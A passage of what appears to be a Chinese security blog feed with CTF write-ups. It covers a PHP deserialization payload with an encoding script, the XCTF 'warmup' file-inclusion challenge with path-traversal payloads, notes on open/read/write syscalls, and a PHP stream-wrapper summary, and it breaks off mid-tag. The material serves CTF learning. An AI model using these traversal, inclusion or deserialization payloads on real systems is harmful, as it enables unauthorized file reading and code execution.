title="3.构造payload"></a><code>3.构造payload</code></h4><p>根据上文分析，我们可以构造如下的payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+<span class="number">4</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">"\x00Demo\x00file"</span>;s:<span class="number">8</span>:<span class="string">"fl4g.php"</span>;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>但是我们需要将其进行base64编码，这里就需要注意一个常见的坑，就是<code>private</code>属性的名字填写，两边要有两个<code>\x00</code>，这个时候我们不能直接将其进行base64编码，所以我们要将其用十六进制形式打开，改掉里面的内容，或者用下面的脚本进行修改：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"2.txt"</span>,<span class="string">"r+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        line = line.strip(<span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(line)):</span><br><span class="line">            s += line[i]</span><br><span class="line">            <span class="keyword">if</span> i &lt; len(line) - <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> (line[i+<span class="number">1</span>] == <span class="string">"D"</span> <span class="keyword">and</span> line[i<span class="number">-2</span>] == <span class="string">"0"</span>) <span class="keyword">or</span> (line[i] == <span class="string">"o"</span> <span class="keyword">and</span> line[i+<span class="number">1</span>] == <span class="string">"f"</span>):</span><br><span class="line">                    s += chr(int(<span class="string">"0x00"</span>,<span class="number">16</span>))</span><br><span class="line">                    print(<span class="string">"1"</span>)</span><br><span class="line">    print(base64.b64encode(bytes(s,encoding=<span class="string">"gbk"</span>)))</span><br></pre></td></tr></table></figure></p><p>得到如下flag：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">"ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-文件包含问题"><a href="#0x02-文件包含问题" class="headerlink" title="0x02 文件包含问题"></a><font color="navy"><code>0x02 文件包含问题</code></font></h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a><font color="blue"><code>基础知识</code></font></h3><p><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">参考链接</a></p><blockquote><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。注意：<code>如果被包含的文件中无有效的php代码，则会直接把文件内容输出。</code></p><p>如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。常见包含函数有：<code>include()</code>、<code>require()</code>，这两者的区别有：</p><ol><li><code>include</code> 是当代码执行到它的时候才加载文件，发生错误的时候只是给一个警告，然后继续往下执行</li><li><code>require</code> 是只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行</li></ol><p>require一般是用于文件头包含类文件、数据库等等文件，include一般是用于包含html模版文件<br>include_once()、require_once()与(include\require)的功能相同，只是区别于当重复调用的时候，它只会调用一次</p></blockquote><h3 id="【XCTF-web】warmup"><a href="#【XCTF-web】warmup" class="headerlink" title="【XCTF-web】warmup"></a><font color="blue"><code>【XCTF-web】warmup</code></font></h3><h4 id="1-题目描述-3"><a href="#1-题目描述-3" class="headerlink" title="1.题目描述"></a><code>1.题目描述</code></h4><p><img src="/images/142-3.png" alt></p><blockquote><p>从上图可以看出，题目给出的网址打开之后只出现一个大大的笑脸，F12打开源码看见被注释掉了一段“source.php”，我们下面打开该网址，得到如下PHP源码：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-题目分析-2"><a href="#2-题目分析-2" class="headerlink" title="2.题目分析"></a><code>2.题目分析</code></h4><p>我们从上文源码中可以看到，还有一个<code>hint.php</code>文件，我们打开一下看看里面有什么提示信息，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><blockquote><p>从上文可以看出我们要的flag在ffffllllaaaagggg文件中，那么我们可能需要遍历目录查找该文件。</p></blockquote><p>下面我们分析上面的PHP源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>]) &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>]) &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>]))</span><br></pre></td></tr></table></figure><blockquote><p>如果同时满足上述三个条件，即可执行文件包含漏洞，这三个条件分别是：</p><ol><li>输入的字符串要为非空（因为如果输入的字符串是非空，empty返回False，那么!empty是True）</li><li>is_string()：要求输入的是字符串是字符串</li><li>要满足checkFile函数返回的是True</li></ol><p>下面我们就分析一下checkFile，我们要使得他的返回值为True</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要求我们的输入为非空字符串</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要求我们输入的字符串要为source.php或者hint.php，否则不执行。这里是第一个返回True的地方，我们先记为 ①</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">$page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>首先会执行<code>mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</code>，该函数会返回输入字符串之后加上<code>?</code>之后的首次出现<code>?</code>的位置，<code>mb_substr</code>函数会返回我们输入字符串从0到首次出现?之前的字符串，如果该字符串有”source.php”或者”index.php”则返回true，这里我们记为②</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">$_page,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>会对我们输入的payload进行url解码，然后执行同上的操作，然后返回true，这里我们记为③</p></blockquote><h4 id="3-构造payload-2"><a href="#3-构造payload-2" class="headerlink" title="3.构造payload"></a><code>3.构造payload</code></h4><p>根据第2部分的分析，要想能够输入我们的payload，我们可以使得checkFile函数返回true的地方只有②和③</p><p>② 处的payload为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?(payload) 或者为 ?file=source.php%3F(payload)</span><br></pre></td></tr></table></figure><p>③ 处的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php%253F(payload)</span><br></pre></td></tr></table></figure><p>下面就是如何确定在哪个目录下，这就需要我们一个一个进行尝试了，在尝试之后发现<code>ffffllllaaaagggg</code>在/../../../../ffffllllaaaagggg中，所以payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?/../../../../ffffllllaaaagggg</span><br><span class="line">?file=source.php%3F/../../../../ffffllllaaaagggg</span><br><span class="line">?file=source.php%253F/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><h4 id="4-目录遍历问题"><a href="#4-目录遍历问题" class="headerlink" title="4.目录遍历问题"></a><code>4.目录遍历问题</code></h4><p>经过测试发现并确定，这种包含的前提是<code>包含的文件必须是当前文件夹不存在的文件</code>，<strong>只有这样才会将该文件解析成目录</strong>，从而遍历其他文件；此处<font color="navy"><strong>hint.php?被解析认为是一个目录，但该目录并不存在，因此第一次<code>../</code>仅仅又是回到当前source.php的目录下</strong></font>。</p><div class="table-container"><table><thead><tr><th style="text-align:left">目录遍历</th><th style="text-align:left">解析</th></tr></thead><tbody><tr><td style="text-align:left">../</td><td style="text-align:left">/var/www/html</td></tr><tr><td style="text-align:left">../../</td><td style="text-align:left">/var/www</td></tr><tr><td style="text-align:left">../../../</td><td style="text-align:left">/var</td></tr><tr><td style="text-align:left">../../../../</td><td style="text-align:left">/</td></tr></tbody></table></div><p>此外，在<code>Windows</code>下<code>hint.php?</code>无法被解析为目录，在<code>linux</code>下成功认为是目录，原因为Windows系统文件命名不支持问号。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-函数漏洞问题&quot;&gt;&lt;a href=&quot;#0x00-函数漏洞问题&quot; class=&quot;headerlink&quot; title=&quot;0x00 函数漏洞问题&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 函数漏洞问题&lt;/code&gt;&lt;/font&gt;&lt;/h
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF中常见的函数总结</title>
    <link href="https://muzibing.github.io/2020/07/27/2020.07.27%EF%BC%88141%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/27/2020.07.27（141）/</id>
    <published>2020-07-26T16:00:00.000Z</published>
    <updated>2020-07-27T10:54:59.838Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-navy0x00-pwn题font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-pwn题font"></a> <font color="navy"><code>0x00 pwn题</code></font></h2><h3 id="font-color-blue1open函数font"><a class="markdownIt-Anchor" href="#font-color-blue1open函数font"></a> <font color="blue"><code>1.open()函数</code></font></h3><h4 id="函数原型"><a class="markdownIt-Anchor" href="#函数原型"></a> <code>函数原型</code></h4><blockquote><p><code>int open(const char *path, int flags,int mode)；</code></p></blockquote><p><code>flags</code></p><table><thead><tr><th style="text-align:center">常量名称</th><th style="text-align:center">数字</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">O_RDONLY</td><td style="text-align:center">0</td><td style="text-align:center">只读模式</td></tr><tr><td style="text-align:center">O_WRONLY</td><td style="text-align:center">1</td><td style="text-align:center">只写模式</td></tr><tr><td style="text-align:center">O_RDWR</td><td style="text-align:center">2</td><td style="text-align:center">可读可写</td></tr></tbody></table><h4 id="函数功能"><a class="markdownIt-Anchor" href="#函数功能"></a> <code>函数功能</code></h4><blockquote><p>以各种方式打开文件</p></blockquote><h4 id="函数返回值"><a class="markdownIt-Anchor" href="#函数返回值"></a> <code>函数返回值</code></h4><blockquote><p>如果调用成功，它将返回一个可以被<code>read</code>和<code>write</code>等其他系统调用使用的<font color="red"><code>文件描述符</code></font>。这个文件描述符是唯一的。它不会与任何其他运行中的进程共享，除非是fork了子进程。如果两个进程同时打开一个文件，他们会分别得到两个不同的文件描述符。如果他们都对文件进行写操作，那么他们会各写各的，它们分别接着自己上次离开的位置继续往下写，数据不会交织在一起，而是会彼此覆盖。我们可以使用文件锁功能来防止这种事件。’</p></blockquote><p><code>返回的文件描述符</code></p><blockquote><p>fd的值一般是<code>3</code>开始，依次增加。比如我open了两个文件，那么它们的fd分别为3和4。</p></blockquote><h4 id="系统调用号"><a class="markdownIt-Anchor" href="#系统调用号"></a> <code>系统调用号</code></h4><blockquote><p><code>2 open sys_open fs/open.c</code></p></blockquote><h3 id="font-color-blue2read函数font"><a class="markdownIt-Anchor" href="#font-color-blue2read函数font"></a> <font color="blue"><code>2.read()函数</code></font></h3><h4 id="头文件"><a class="markdownIt-Anchor" href="#头文件"></a> <code>头文件</code></h4><blockquote><p><code>#include&lt;unistd.h&gt;</code></p></blockquote><h4 id="函数原型-2"><a class="markdownIt-Anchor" href="#函数原型-2"></a> <code>函数原型</code></h4><blockquote><p><code>ssize_t read(int fd, void *buf, size_t count);</code></p></blockquote><h4 id="函数功能-2"><a class="markdownIt-Anchor" href="#函数功能-2"></a> <code>函数功能</code></h4><blockquote><p>读取文件内容：<strong>read()会把参数<code>fd</code>所指的文件传送 <code>count</code>个字节到buf 指针所指的内存中</strong>。</p></blockquote><h4 id="函数返回值-2"><a class="markdownIt-Anchor" href="#函数返回值-2"></a> <code>函数返回值</code></h4><blockquote><p>参数count 为0，则read()不会有作用并返回0。返回值为实际读取到的字节数, 如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动：</p><ul><li>当文件的整体字节比<code>count</code>小时，读到文件尾、从管道(pipe)或终端机读取、我们读取时被一个信号打断了等等情况。</li><li>当有错误发生时则返回-1, 错误代码存入errno 中, 而文件读写位置则无法预期。</li></ul></blockquote><h4 id="测试用例"><a class="markdownIt-Anchor" href="#测试用例"></a> <code>测试用例</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] =<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">int</span> fp = open(<span class="string">"./test.txt"</span>, O_RDONLY);<span class="comment">//只读模式打开文件</span></span><br><span class="line">    res = read(fp,buffer,<span class="number">60</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"read %d bits,they are %s\n"</span>,res,buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,strerror(errno));</span><br><span class="line">    close(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="系统调用号-2"><a class="markdownIt-Anchor" href="#系统调用号-2"></a> <code>系统调用号</code></h4><blockquote><p><code>0 read sys_read fs/read_write.c</code></p></blockquote><h3 id="font-color-blue3write函数font"><a class="markdownIt-Anchor" href="#font-color-blue3write函数font"></a> <font color="blue"><code>3.write()函数</code></font></h3><h4 id="头文件-2"><a class="markdownIt-Anchor" href="#头文件-2"></a> <code>头文件</code></h4><blockquote><p><code>#include&lt;unistd.h&gt;</code></p></blockquote><h4 id="函数原型-3"><a class="markdownIt-Anchor" href="#函数原型-3"></a> <code>函数原型</code></h4><blockquote><p><code>ssize_t write(int fd,const void *buf, size_t count);·</code></p><ul><li><strong>fd</strong>：是文件描述符（write所对应的是写，即就是1，这是标准输出）</li><li><strong>buf</strong>：通常是一个字符串，需要写入的字符串</li><li><strong>count</strong>：是每次写入的字节数</li></ul></blockquote><h4 id="函数功能-3"><a class="markdownIt-Anchor" href="#函数功能-3"></a> <code>函数功能</code></h4><blockquote><p>打印文件内容</p></blockquote><h4 id="函数返回值-3"><a class="markdownIt-Anchor" href="#函数返回值-3"></a> <code>函数返回值</code></h4><blockquote><ul><li><p>成功：返回读出的字节数</p></li><li><p>失败：返回-1，并设置errno，如果在调用 read 之前到达文件末尾，则这次read返回 0</p></li></ul></blockquote><h4 id="系统调用号-3"><a class="markdownIt-Anchor" href="#系统调用号-3"></a> <code>系统调用号</code></h4><blockquote><p><code>1 write sys_write fs/read_write.c</code></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-navy0x00-pwn题font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-pwn题font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 p
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP伪协议总结</title>
    <link href="https://muzibing.github.io/2020/07/25/2020.07.25%EF%BC%88140%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/25/2020.07.25（140）/</id>
    <published>2020-07-24T16:00:00.000Z</published>
    <updated>2020-07-25T07:00:53.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-navy0x00-file协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-file协议font"></a> <font color="navy"><code>0x00 file://协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p></li><li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code>会可选地搜索，也作为相对的路径。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:///path/to/file.ext</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p></li></ul><p>      1. <code>file://[文件的绝对路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-1.jpg" alt></p><p>      2. <code>[文件的绝对路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-2.jpg" alt></p><p>      3. <code>[http://网络路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-3.jpg" alt></p><ul><li><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.file.php</a></li></ul><h2 id="font-color-navy0x01-php协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-php协议font"></a> <font color="navy"><code>0x01 php://协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li></ul></li><li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p></li></ul><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input</code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><ul><li><p><strong><code>php://filter</code>参数详解</strong></p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p></li></ul><table><thead><tr><th>php://filter 参数</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（<strong>|</strong>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链</td></tr></tbody></table><ul><li><p><strong>可用的过滤器列表（4类）</strong></p><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://www.php.net/manual/zh/filters.php" target="_blank" 